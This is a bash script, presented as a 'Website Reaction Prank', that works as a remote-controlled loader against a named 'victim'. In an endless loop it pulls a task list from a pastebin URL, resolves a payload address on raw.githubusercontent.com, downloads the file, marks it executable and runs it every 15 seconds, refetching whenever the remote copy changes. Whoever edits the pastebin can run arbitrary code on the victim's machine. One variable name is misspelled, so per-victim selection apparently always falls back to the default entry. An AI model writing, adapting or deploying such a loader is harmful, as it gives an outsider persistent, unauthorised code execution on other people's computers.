#!/usr/bin/env bash
# Download and run a script from a prepspecified location.

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

victim="$1"
if [ -z "$victim" ]; then
  victim="$USER.`hostname`"
fi

###################################################################
 # Configuration variables
taskURL="https://pastebin.com/raw/PPUdAf1s"

localTaskData="$SCRIPTDIR/taskdata"
localPayloadFile="$SCRIPTDIR/payload"
localPayloadETagFile="$SCRIPTDIR/payload.etag"
localPayloadURLFile="$SCRIPTDIR/payload.url"

###################################################################

# Remove the payload and local values

rm -rf "$localPayloadFile" "$localPayloadETagFile" "$localPayloadURLFile"
touch "$localPayloadFile"
touch "$localPayloadETagFile"
touch "$localPayloadURLFile"

###################################################################

function getURLETag(){
  #echo "getURLETag: $1" >&2
  local remoteURL="$1"

  curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
   | grep '^ETag' \
   | cut -d'"' -f2
}

function getTaskURL(){
  #echo "getTaskURL: $1" >&2
  local victimID="$1"

  cat "$localTaskData" \
   | grep -v -e '^#' -e'^$' \
   | grep "^$victimID" \
   | cut -d\   -f2 \
   | head -n1
}

function getPayloadURL(){
  #echo "getPayloadURL: $1" >&2
  local url="$1"
  local victimID="$2"
  
  curl -H 'Cache-Control: no-cache' -s "$url" \
   | tr -d '\015' \
   > "$localTaskData"
  local payloadURL=`getTaskURL "$victimiID"`
  if [ -z "$payloadURL" ]; then
    payloadURL=`getTaskURL "default"`
  fi
  echo "https://raw.githubusercontent.com/thiesgehrmann/$payloadURL"

}

function downloadURL(){
  #echo "downloadURL: $1, $2"
  local url="$1"

  local outfile="$2"
  echo "downloadURL: Downloading $url"
  curl -s "$url" > "$outfile"
  chmod +x "$outfile"
}

function downloadPayloadIfNeeded(){

  local remoteURL=`getPayloadURL "$taskURL" "$victim"`
  local remoteURLETag=`getURLETag "$remoteURL"`
  localURL=`head -n1 "$localPayloadURLFile"`
  localETag=`head -n1 "$localPayloadETagFile"`

  echo "downloadPayloadIfNeeded: l-> $localURL"
  echo "downloadPayloadIfNeeded: r-> $remoteURL"
  echo "downloadPayloadIfNeeded: l-> $localETag"
  echo "downloadPayloadIfNeeded: r-> $remoteURLETag"

    # We have a totally new URL, we should get it no matter what!
  if [ "$remoteURL" != "$localURL" ]; then
    echo "downloadPayloadIfNeeded: We have a new URL!"
    downloadURL "$remoteURL" "$localPayloadFile"
    echo "$remoteURL" > "$localPayloadURLFile"
    echo "$remoteURLETag" > "$localPayloadETagFile"

  else
    echo "downloadPayloadIfNeeded: Same URL"

    if [ "$localETag" != "$remoteURLETag" ]; then
      echo "downloadPayloadIfNeeded: The payload has been updated!"
      downloadURL "$remoteURL" "$localPayloadFile"
      echo "$remoteURLETag" > "$localPayloadETagFile"
    fi
  fi

}

function runPayload() {
  echo "runPayload: Running"
  "$localPayloadFile" "$victim" "$iteration"
}

###################################################################

echo "#################################"
echo "# Website Reaction Prank         "
echo "# VictimID: $victim              "
echo "#################################"

iteration=1

while [ true ]; do

  echo "###################################"
  echo "Iteration $iteration"
  echo ""

  downloadPayloadIfNeeded

  runPayload

  sleep 15

  let iteration=$((iteration+1))

done
